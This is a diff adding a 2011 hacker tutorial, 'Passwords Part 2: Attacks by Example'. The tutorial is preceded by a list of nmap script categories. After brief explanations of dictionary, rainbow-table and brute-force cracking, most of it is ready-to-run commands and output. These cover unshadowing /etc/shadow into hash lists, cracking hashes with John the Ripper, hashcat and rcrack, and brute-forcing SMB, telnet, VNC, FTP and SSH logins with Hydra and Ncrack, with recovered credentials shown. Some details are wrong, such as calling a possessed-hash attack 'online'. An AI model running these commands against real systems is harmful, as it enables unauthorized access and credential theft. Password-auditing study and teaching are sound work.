@@ -1,0 +1,581 @@
+nmap  scriptcategorylist:
+
+    auth
+    broadcast
+    brute
+    default
+    discovery
+    dos
+    exploit
+    external
+    fuzzer
+    intrusive
+    malware
+    safe
+    version
+    vuln
+
+
+
+
+
+ ---------------------------------------------------------------------------------------------
+|            CONTENTS                       |            DESCRIPTON                           |
+|-------------------------------------------|-------------------------------------------------|
+| 0X00 PREFACE                              | TITLE: PASSWORDS PART 2: ATTACKS BY EXAMPLE     |
+| 0X01 ATTACKS                              | BY   : keisterstash                             |
+| 0X02 DICTIONARY                           | DATE : 04/17/11                                 |
+| 0X03 RAINBOW TABLES                       | EMAIL: keister.stashin [at] gmail               |
+| 0X04 BRUTEFORCE                           |                                                 |
+| 0X05 JOHN THE RIPPER -OFFLINE ATTACK TOOL |			                              |
+| 0X06 HASHCAT - OFFLINE ATTACK TOOL        |                                                 |
+| 0X07 RCRACK - OFFLINE ATTACK TOOL         |                                                 |
+| 0X08 THC-HYDRA - ONLINE ATTACK TOOL       |                                                 |
+| 0X09 NCRACK - ONLINE ATTACK TOOL          |                                                 |
+| 0X0A RESOURCES                            |                                                 |
+ ---------------------------------------------------------------------------------------------
+
+***wordlists, hashlists(practice), and rainbow table resources will be listed at the end of this document***
+	      *** more tools will be added when we have more time to play***
+0x00 PREFACE
+
+Part 2 will demonstrate a bunch of tools by example, so that you can quickly find one that meets
+yours needs and to be able to apply it quickly for common tasks. Some of the examples below, were
+taken from the specific tools' documentation.
+
+0x01 ATTACKS
+
+We have two categories of attacks and then a few tactics for carrying out the attacks. First, we have
+offline and online attacks. An offline attack is an attack you use when you have obtained the hash(es).
+In other words, you have them physically or digitally, in your possession or in your sight. You simply
+then compare other generated hashes with that one(or ones) in hopes of a match. An online attack is
+where the hash(es) are not in your possession and you must compare, typically over a network by 
+sending multiple password guesses to an application, which hashes your password guesses and compares them
+to its stored hashes.
+
+From these two categories of attacks we have three different tactics: dictionary, rainbow tables, and
+bruteforce.
+
+0x02 DICTIONARY
+
+A dictionary is simply a text file with a bunch of words, characters, and/or combinations of words and
+characters (phrase). Another term synonymous with dictionary is a wordlist. They are used interchangeably
+and refer to the same thing.
+
+The general idea is that people consistently choose weak, common passwords. These are usually simple words
+that can be found in a dictionary e.g. dog, cat, house. A dictionary is a collection of words that house
+these common passwords (and some not so common ones). 
+
+In an online attack, we have a hash, and we have a dictionary to run against that hash. Our password cracking 
+program will generate a hash for each entry in the dictionary and compare that entry with the hash that
+you're wanting to crack. If the hash of 'dog' is identical to the hash that is in your possession, we now
+know that dog is the password (unless there is a collision, unlikely, but it will still work). Offline 
+dictionary attacks are fast and totally dependent on your machines physical attributes. With a modern 
+machine you can typically run through a wordlist with 14 million entries in under a minute or two.
+
+In an online dictionary attack, we have the wordlist and a program that will send the entries over the
+network unhashed. The receiving application will handle the hashing or send it to the operating system
+for hashing, the results will then be compared as usual. This method is much slower, as there are more
+steps involved. An example of this is when we want to run a dictionary against an FTP server.
+
+0x03 RAINBOW TABLES
+
+We briefly discussed rainbow tables in part 1, but we will cover them again here. A rainbow table
+is simply a file that contains pre-computed hashes. In other words the hashes are already there, waiting
+to be compared. This reduces your CPU's workload, by focusing on smaller tasks, in result, being more
+efficient.
+
+In a dictionary attack, we have to generate the hash from the dictionary entry and then compare it.
+Using rainbow tables, we already have the hashes and we will only need to compare. To produce a rainbow table
+someone must spend there time generating hashes before hand. Similar to dictionaries, many people will spend
+a lot of time creating huge compilations of hashes and distribute them over the internet. One problem with 
+rainbow tables is that tables get extremely large and they do quickly. I've seen 500 GB and larger tables floating
+around the net. Another problem with rainbow tables is the salting issue we discussed in part 1:
+
+"The salt value is not secret and may be generated at random and stored with the password hash. A large salt
+value prevents precomputation attacks, including rainbow tables, by ensuring that each user's password is 
+hashed uniquely. This means that two users with the same password will have different password hashes 
+(assuming different salts are used). In order to succeed, an attacker needs to precompute tables for each
+possible salt value. The salt must be large enough, otherwise an attacker can make a table for each salt value."
+
+Another technique that can be used to decrease the effectiveness of rainbows tables is key stretching.
+
+"When stretching is used, the salt, password, and a number of intermediate hash values are run through the 
+underlying hash function multiple times to increase the computation time required to hash each password.
+For instance, MD5-Crypt uses a 1000 iteration loop that repeatedly feeds the salt, password, and current 
+intermediate hash value back into the underlying MD5 hash function. The user's password hash is the concatenation
+of the salt value (which is not secret) and the final hash. The extra time is not noticeable to a user 
+because the user only has to wait a fraction of a second each time the user logs in. On the other hand, 
+stretching greatly reduces the effectiveness of a brute-force or precomputation attacks because it reduces
+the number of computations an attacker can perform in a given time frame."
+
+0x04 BRUTEFORCE
+
+I believe almost everyone knows what a bruteforce attack is. It is simply trying all possible combinations
+available. Depending on the characters used, it could be [a-z]..[A-Z]..[0-9]..and special characters. It
+is by far the slowest method of the three and for good reason. We must not only create the "entries", but we
+must also hash them and then compare them. 
+
+As passwords get larger in size, the possibilites grow exponentially with each new bit. A four character 
+password get could "bruted" in under a minute while a 16 character password might take a year a more
+before it exhausts the entire key space.
+
+Now, onto the good stuff.
+
+0x05 JOHN THE RIPPER - OFFLINE ATTACK TOOL
+
+john is a legend that has been around for many years.
+
+"John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, BeOS,
+and OpenVMS. Its primary purpose is to detect weak Unix passwords. Besides several crypt(3) password hash types
+most commonly found on various Unix systems, supported out of the box are Windows LM hashes, plus many more with
+contributed patches." 
+
+$ ./john
+John the Ripper password cracker, version 1.7.6
+Copyright (c) 1996-2010 by Solar Designer
+Homepage: http://www.openwall.com/john/
+
+Usage: john [OPTIONS] [PASSWORD-FILES]
+--single                   "single crack" mode
+--wordlist=FILE --stdin    wordlist mode, read words from FILE or stdin
+--rules                    enable word mangling rules for wordlist mode
+--incremental[=MODE]       "incremental" mode [using section MODE]
+--external=MODE            external mode or word filter
+--stdout[=LENGTH]          just output candidate passwords [cut at LENGTH]
+--restore[=NAME]           restore an interrupted session [called NAME]
+--session=NAME             give a new session the NAME
+--status[=NAME]            print status of a session [called NAME]
+--make-charset=FILE        make a charset, FILE will be overwritten
+--show                     show cracked passwords
+--test[=TIME]              run tests and benchmarks for TIME seconds each
+--users=[-]LOGIN|UID[,..]  [do not] load this (these) user(s) only
+--groups=[-]GID[,..]       load users [not] of this (these) group(s) only
+--shells=[-]SHELL[,..]     load users with[out] this (these) shell(s) only
+--salts=[-]COUNT           load salts with[out] at least COUNT passwords only
+--format=NAME              force hash type NAME: DES/BSDI/MD5/BF/AFS/LM/crypt
+--save-memory=LEVEL        enable memory saving, at LEVEL 1..3
+
+/* The first step when cracking passwords with john the ripper is to unshadow
+the target passwd file, this will create the hash list */
+
+$ ./unshadow /etc/passwd /etc/master.passwd > outpasswd (BSD)
+$ ./unshadow /etc/passwd /etc/shadow > outpasswd (linux)
+
+
+/* To specify our own wordlist */
+
+$ ./john -wordfile:wordlist.txt outpasswd
+
+/* We can also use incremental (bruteforce) mode.  This allows us to specify which character sets to try,
+only letters, only numbers, "letters, numbers, and some special characters", and all characters
+respectively */
+
+$ ./john -incremental:alpha outpasswd 
+$ ./john -incremental:digits outpasswd 
+$ ./john -incremental:lanman outpasswd
+$ ./john -incremental:all outpasswd 
+
+/* John supports several hashes, it will determine which hashing algorithm to use
+even if you don't specify the algorithm.  You may, however, find yourself in a situation
+where you want to force a hashing algorithm.  To do that: */
+
+$ ./john -format:DES outpasswd
+$ ./john -format:BSDI outpasswd
+$ ./john -format:MD5 outpasswd
+$ ./john -format:BF outpasswd
+$ ./john -format:AFS outpasswd
+$ ./john -format:LM outpasswd
+
+/* Sometimes you may have to split your password cracking sessions up.  If you're running
+john and have to kill it, you can restore your session with: */
+
+$ ./john -restore
+
+/* Even if you supply no options, john will start cracking passwords for you.  Here's some
+example output */
+
+$ ./john outpasswd
+Loaded 5 password hashes with 5 different salts (OpenBSD Blowfish [32/32])
+simple           (greg0)
+
+/* For those of us interested in stats, you can use `./john -test` to see how fast it's
+performing on your machine. */
+
+$ ./john -test
+
+/* To only crack accounts with a "good" shell (in general, the shell, user, and group filters
+described above work for all cracking modes as well): */
+
+$ ./john --wordlist=all.lst --rules --shells=sh,csh,tcsh,bash outpasswd`
+
+/* This will try cracking all root (UID 0) accounts in all the password files: */
+
+$ ./john --wordlist=all.lst --rules --users=0 outpasswd
+
+/* Alternatively, you may wish to not waste time cracking your very own passwords, if you're sure they're uncrackable: */
+
+$ ./john --wordlist=all.lst --rules --users=-root,gre0 outpasswd
+
+
+0x06 HASHCAT - OFFLINE ATTACK TOOL
+
+A very fast, advanced offline cracker:
+
+"Free, Multi-Threaded, Multi-Hash, Linux & Windows native binaries, Fastest cpu-based multihash cracker..."
+
+/* print hashcat version */
+
+$ ./hashcat-cli32.bin -V
+0.36
+
+/* supported algorithms */
+$ ./hashcat-cli32.bin --help | grep [0-9] | awk '(NR > 13 && NR < 35) {print $0}'
+
+   0 = MD5                           200 = MySQL
+   1 = md5($pass.$salt)              300 = MySQL4.1/MySQL5
+   2 = md5($salt.$pass)              400 = MD5(Wordpress)
+   3 = md5(md5($pass))               400 = MD5(phpBB3)
+   4 = md5(md5(md5($pass)))          500 = MD5(Unix)
+   5 = md5(md5($pass).$salt)         600 = SHA-1(Base64)
+   6 = md5(md5($salt).$pass)         700 = SSHA-1(Base64)
+   7 = md5($salt.md5($pass))         800 = SHA-1(Django)
+   8 = md5($salt.$pass.$salt)        900 = MD4
+   9 = md5(md5($salt).md5($pass))   1000 = NTLM
+  10 = md5(md5($pass).md5($salt))   1100 = Domain Cached Credentials
+  11 = md5($salt.md5($salt.$pass))  1200 = MD5(Chap)
+  12 = md5($salt.md5($pass.$salt))  1300 = MSSQL
+  30 = md5($username.0.$pass)
+  31 = md5(strtoupper(md5($pass)))
+ 100 = SHA1                         1400 = SHA256
+ 101 = sha1($pass.$salt)            1600 = MD5(APR)
+ 102 = sha1($salt.$pass)            1700 = SHA512
+ 103 = sha1(sha1($pass))            1800 = SHA-512(Unix)
+ 104 = sha1(sha1(sha1($pass)))
+ 105 = sha1(strtolower($username).$pass)
+
+/* dictionary attack, straight (wordlist only), -m 0 = md5 (can be omitted, default), -a 0 = attack type 0 is straight
+after options, first argument is the hash list to crack, and the second is the wordlist */
+
+$ ./hashcat-cli32.bin -m 0 -a 0 testhashlist.txt ../wordlists/rockyou.txt
+Initializing with 8 threads and 32mb segment-size...
+
+NOTE: press enter for status-screen
+
+Added hashes from file testhashlist.txt: 2 (1 salts)
+a41d81871cc00919542ac86f493b9b76:monkey1
+25d961aa7283c618c54413d5399c1613:prayer
+All hashes have been recovered
+Killed: 9
+
+/* md5 combination attack ran with the wordlist and then wordlist+[0-9] d = digit */
+
+$ ./hashcat-cli32.bin -m 0 -a 1 ../hashlists/md5.txt ../wordlists/rockyou.txt ?d
+
+Initializing with 8 threads and 32mb segment-size...
+
+NOTE: press enter for status-screen
+
+Added hashes from file ../hashlists/md5.txt: 89173 (1 salts)
+
+Wordlist..: ../wordlists/rockyou.txt
+Index.....: 1/5 (segment), 3627099 (words), 33550343 (bytes)
+Recovered.: 0/89173 hashes, 0/1 salts
+Speed/sec.: 2.41M plains, - words
+Progress..: 48/3627099 (0.00%)
+Running...: 00:00:01:17
+Estimated.: --:--:--:--
+b4ad84c27cb9777bdde5aaee36edefd9:1234567812340987
+f962890db67db0e01575626563aac60c:danieleuropa1
+928f7bcdcd08869cc44c1bf24e7abec6:1234567890abcdefghijklmnopqrstuvwxyz
+4ffebaea34b6f263a0c9cfc2bd7c60ea:tequiero30011988
+
+Wordlist..: ../wordlists/rockyou.txt
+Index.....: 1/5 (segment), 3627099 (words), 33550343 (bytes)
+Recovered.: 4/89173 hashes, 0/1 salts
+Speed/sec.: 2.51M plains, - words
+Progress..: 1246/3627099 (0.03%)
+Running...: 00:00:30:06
+Estimated.: --:--:--:--
+
+[ output cut for brevity ]
+
+/* same as above but with -n 20 (20 threads) and --remove (remove the hash from the list), -o is output file,
+l = lowercase, u = uppercase, d = digit, s = special */
+
+$ ./hashcat-cli33.bin -m 0 -a 1 -n 20 --remove -o crackresults.txt ../hashlists/md5.txt ../wordlists/rockyou.txt ?d?d?u?l?s
+
+Initializing with 20 threads and 32mb segment-size...
+
+NOTE: press enter for status-screen
+
+Added hashes from file ../hashlists/md5.txt: 89173 (1 salts)
+
+Wordlist..: ../wordlists/rockyou.txt
+Index.....: 1/5 (segment), 3627099 (words), 33550343 (bytes)
+Recovered.: 2/89173 hashes, 0/1 salts
+Speed/sec.: 2.88M plains, - words
+Progress..: 277/3627099 (0.01%)
+Running...: 00:00:05:59
+Estimated.: --:--:--:--
+
+[ cut for brevity ]
+
+/* -a 2 (Toggle-Case), try every possible case combination on the word, abc, aBc, ABc, AbC, etc
+toggle rules are located in hashcat's tables directory */
+
+$ ./hashcat-cli32.bin -m 0 -a 2 -n 20 ../hashlists/md5.txt ../wordlists/rockyou.txt
+
+/* permutations are when you re-arrange every possible combination of letters: abc, cba, acb, bac, bca etc.
+-a 4 (permutations), we use --perm-min=4 and --perm-max=8 to do permutations on all words with a character length
+of 4 - 8, words with those lengths and in between will be use. In the example below 
+only words with a character length of 4-8 will be permuted. We are also using a memory segment size of 38, 38 MB's
+of the dictionary will be loaded into memory at a time instead of the default 32.(I noticed a speed improvement when I did this)
+When finished, the next 38 MB's of the dictionary will be loaded */
+
+$ ./hashcat-cli32.bin -m 0 -a 4 --perm-min=4 --perm-max=4 -n 20 --segment-size=38 ../hashlists/md5.txt ../wordlists/rockyou.txt
+
+/* combination attack with a rule list, using d3ad0ne's rulelist, -n = 25 threads, output to file, -m 0 (md5) */
+
+$ ./hashcat-cli32.bin -a 1 -m 0 -n 25 -r /rules/d3ad0ne.rule -o /results/cracked.txt ../hashlists/md5.txt ../wordlists/rockyout.txt
+
+/* brute force attack with charset and do not bruteforce more than 10 character positions (max characters of 10), -m 100 = sha */
+
+$ ./hashcat-cli32.bin -a 3 --bf-cs-buf abcdefghijklmnopqrstuvwxyz0123456789 --bf-pw-max 10 -m 100 -n 5 ../hashlists/sha.txt
+
+0x07 RAINBOW CRACK - OFFLINE ATTACK TOOL
+
+"RainbowCrack is a general purpose implementation of Philippe Oechslin's faster time-memory trade-off technique. It crack hashes with rainbow tables."
+
+/* check out menu - rcrack is very simple to use */
+
+$ rcrack
+
+RainbowCrack 1.2 - Making a Faster Cryptanalytic Time-Memory Trade-Off
+by Zhu Shuanglei <shuanglei@hotmail.com>
+http://www.antsight.com/zsl/rainbowcrack/
+
+usage: rcrack rainbow_table_pathname -h hash
+       rcrack rainbow_table_pathname -l hash_list_file
+       rcrack rainbow_table_pathname -f pwdump_file
+rainbow_table_pathname: pathname of the rainbow table(s), wildchar(*, ?) supported
+-h hash:                use raw hash as input
+-l hash_list_file:      use hash list file as input, each hash in a line
+-f pwdump_file:         use pwdump file as input, this will handle lanmanager hash only
+
+example: rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592
+         rcrack *.rt -l hash.txt
+         rcrack *.rt -f hash.txt
+
+/* use a md5 rainbow table against a md5 hash list */
+
+$ rcrack mymd5table.rt -l /hashlists/md5.txt
+
+/* use a md5 rainbow table against a specific md5 hash */
+
+$ rcrack mymd5table.rt -h 4ffebaea34b6f263a0c9cfc2bd7c60ea 
+
+0x08 THC-HYDRA - ONLINE ATTACK TOOL
+
+"A very fast network logon cracker which support many different services."
+
+$ hydra 
+Hydra v6.1 [http://www.thc.org] (c) 2011 by van Hauser / THC <vh@thc.org>
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]
+ [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV]
+ [-4|-6] server service [OPT]
+
+Options:
+  -R        restore a previous aborted/crashed session
+  -S        connect via SSL
+  -s PORT   if the service is on a different default port, define it here
+  -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE try password PASS, or load several passwords from FILE
+  -e ns     additional checks, "n" for null password, "s" try login as pass
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   server list for parallel attacks, one entry per line
+  -o FILE   write found login/password pairs to FILE instead of stdout
+  -f        exit after the first found login/password pair (per host if -M)
+  -t TASKS  run TASKS number of connects in parallel (default: 16)
+  -w TIME   defines the max wait time in seconds for responses (default: 30)
+  -4 / -6   prefer IPv4 (default) or IPv6 addresses
+  -v / -V   verbose mode / show login+pass combination for each attempt
+  server    the target server (use either this OR the -M option)
+  service   the service to crack. Supported protocols: telnet ftp pop3 imap smb smbnt http[s]-{head|get} 
+  http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres
+  nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth pcanywhere teamspeak sip vmauthd firebird ncp afp
+  OPT       some service modules need special input (see README!)
+
+Use HYDRA_PROXY_HTTP/HYDRA_PROXY_CONNECT and HYDRA_PROXY_AUTH env for a proxy.
+Hydra is a tool to guess/crack valid login/password pairs - use allowed only
+for legal purposes! If used commercially, tool name, version and web address
+must be mentioned in the report. Find the newest version at http://www.thc.org
+
+/* use a login list and a password list(dictionary) against .25 via the smb service*/
+
+$ hydra -L loginlist.txt -P passlist.txt 192.168.1.25 smb
+
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+Hydra v5.4 (c) 2006 by van Hauser / THC - use allowed only for legal purposes.
+Hydra (http://www.thc.org) starting at 2011-04-13 10:45:03
+[DATA] 1 tasks, 1 servers, 180 login tries (l:2/p:10), ~180 tries per task
+[DATA] attacking service smb on port 139
+[139][smb] host: 192.168.1.25 login: Administrator password: secret
+[139][smb] host: 192.168.1.25 login: Admin password: mypass
+[STATUS] attack finished for 192.168.1.25 (waiting for childs to finish)
+Hydra (http://www.thc.org) finished at 2011-04-13 10:45:03 
+
+/*try a single login pair: root, secretpass, put the results in outputfile.txt and run
+22 parallel tasks against a telnet daemon*/
+
+$ hydra -L larglist.txt  -P 500pass.txt -o outputfile.txt -t 22 -4 -V 192.168.1.20 telnet
+
+/* try a single username and password against a vnc sever */
+
+$ hydra -l vnuser -p logmein 192.168.1.30 vnc 
+
+0x09 NCRACK - ONLINE ATTACK TOOL
+
+"Ncrack is a high-speed network authentication cracking tool. It was built to help companies secure
+their networks by proactively testing all their hosts and networking devices for poor passwords. 
+Security professionals also rely on Ncrack when auditing their clients. Ncrack was designed using a 
+modular approach, a command-line syntax similar to Nmap and a dynamic engine that can adapt its behaviour
+based on network feedback. It allows for rapid, yet reliable large-scale auditing of multiple hosts.
+
+Ncrack's features include a very flexible interface granting the user full control of network operations,
+allowing for very sophisticated bruteforcing attacks, timing templates for ease of use, runtime interaction
+similar to Nmap's and many more. Protocols supported include RDP, SSH, http(s), SMB, pop3(s), FTP, and telnet."
+
+/* usage */
+
+$ ncrack
+
+Ncrack 0.3ALPHA ( http://ncrack.org )
+Usage: ncrack [Options] {target and service specification}
+TARGET SPECIFICATION:
+  Can pass hostnames, IP addresses, networks, etc.
+  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
+  -iX <inputfilename>: Input from Nmap's -oX XML output format
+  -iN <inputfilename>: Input from Nmap's -oN Normal output format
+  -iL <inputfilename>: Input from list of hosts/networks
+  --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
+  --excludefile <exclude_file>: Exclude list from file
+SERVICE SPECIFICATION:
+  Can pass target specific services in <service>://target (standard) notation or
+  using -p which will be applied to all hosts in non-standard notation.
+  Service arguments can be specified to be host-specific, type of service-specific
+  (-m) or global (-g). Ex: ssh://10.0.0.10,at=10,cl=30 -m ssh:at=50 -g cd=3000
+  Ex2: ncrack -p ssh,ftp:3500,25 10.0.0.10 scanme.nmap.org google.com:80,ssl
+  -p <service-list>: services will be applied to all non-standard notation hosts
+  -m <service>:<options>: options will be applied to all services of this type
+  -g <options>: options will be applied to every service globally
+  Misc options:
+    ssl: enable SSL over this service
+    path <name>: used in modules like HTTP ('=' needs escaping if used)
+TIMING AND PERFORMANCE:
+  Options which take <time> are in seconds, unless you append 'ms'
+  (miliseconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
+  Service-specific options:
+    cl (min connection limit): minimum number of concurrent parallel connections
+    CL (max connection limit): maximum number of concurrent parallel connections
+    at (authentication tries): authentication attempts per connection
+    cd (connection delay): delay <time> between each connection initiation
+    cr (connection retries): caps number of service connection attempts
+    to (time-out): maximum cracking <time> for service, regardless of success so far
+  -T<0-5>: Set timing template (higher is faster)
+  --connection-limit <number>: threshold for total concurrent connections
+AUTHENTICATION:
+  -U <filename>: username file
+  -P <filename>: password file
+  --user <username_list>: comma-separated username list
+  --pass <password_list>: comma-separated password list
+  --passwords-first: Iterate password list for each username. Default is opposite.
+OUTPUT:
+  -oN/-oX <file>: Output scan in normal and XML format, respectively, to the given filename.
+  -oA <basename>: Output in the two major formats at once
+  -v: Increase verbosity level (use twice or more for greater effect)
+  -d[level]: Set or increase debugging level (Up to 10 is meaningful)
+  --nsock-trace <level>: Set nsock trace level (Valid range: 0 - 10)
+  --log-errors: Log errors/warnings to the normal-format output file
+  --append-output: Append to rather than clobber specified output files
+MISC:
+  --resume <file>: Continue previously saved session
+  -f: quit cracking service after one found credential
+  -6: Enable IPv6 cracking
+  -sL or --list: only list hosts and services
+  --datadir <dirname>: Specify custom Ncrack data file location
+  -V: Print version number
+  -h: Print this help summary page.
+MODULES:
+  FTP, SSH, TELNET, HTTP(S), POP3(S)
+EXAMPLES:
+  ncrack -v --user root localhost:22
+  ncrack -v -T5 https://192.168.0.1
+  ncrack -v -iX ~/nmap.xml -g CL=5,to=1h
+SEE THE MAN PAGE (http://nmap.org/ncrack/man.html) FOR MORE OPTIONS AND EXAMPLES
+
+/* display version */
+
+$ ncrack -V
+
+Ncrack version 0.3ALPHA ( http://ncrack.org )
+Modules: SSH, FTP, TELNET, HTTP(S), SMB, RDP, POP3(S)
+
+/* try single login combo */
+
+$ ncrack --user keisterstash --pass ncrackissweet ssh://192.168.1.20:21 
+
+Starting Ncrack 0.3ALPHA ( http://ncrack.org ) at 2011-04-17 00:02 EDT
+
+Discovered credentials for ssh on 192.168.1.20 21/tcp:
+192.168.1.20 21/tcp ssh: 'keisterstash' 'ncrackissweet'
+
+Ncrack done: 1 service scanned in 3.02 seconds.
+
+Ncrack finished.
+
+/* use a wordlist for both username and password, against ftp server and all machines 
+on the network for ssh */ 
+
+$ ncrack -U userlist.txt -P passlist.txt ftp://192.168.1.25:21 192.168.1.*:22 
+
+/* if you don't specify a wordlist ncrack will use its own, nifty, look for its list dir */
+
+$ ncrack 10.0.0.130:21 192.168.1.2:22
+
+Starting Ncrack 0.01ALPHA ( http://ncrack.org ) at 2009-07-24 23:05 EEST
+
+Discovered credentials for ftp on 10.0.0.130 21/tcp:
+10.0.0.130 21/tcp ftp: admin hello1
+Discovered credentials for ssh on 192.168.1.2 22/tcp:
+192.168.1.2 22/tcp ssh: guest 12345
+192.168.1.2 22/tcp ssh: admin money$
+
+/* verbose, connect limit is 10, one attempt per connection, and stop after 12 hours (timeout) */
+
+$ ncrack -v 192.168.1.60:22,cl=10,at=1,ot=12h 
+
+/* verbose, specifiy outfile, wordlists for user and pass, set aggressive timing, logerrors to output file, 
+
+$ ncrack -v -oN outfile.txt --log-errors -U userlist.txt -P passlist.txt -T aggressive
+
+/* extra verbosity, when you ctrl+c ncrack is creates a session info file in your $HOME/.crack/ dir,
+to resume where you left off choose the file */
+
+$ ncrack -vv --resume .ncrack/restore.2011-04-17_04-42 
+
+0x0A RESOURCES
+ 
+http://hashcat.net/
+http://www.openwall.com/john/
+http://www.thc.org/thc-hydra/
+http://nmap.org/ncrack/
+http://www.skullsecurity.org/wiki/index.php/Passwords
+http://hashcrack.blogspot.com/
+http://hashkiller.com/
+http://www.hash-cracker.com/
+http://rainbowtables.shmoo.com/
+http://project-rainbowcrack.com/table.htm
+http://www.freerainbowtables.com/
+
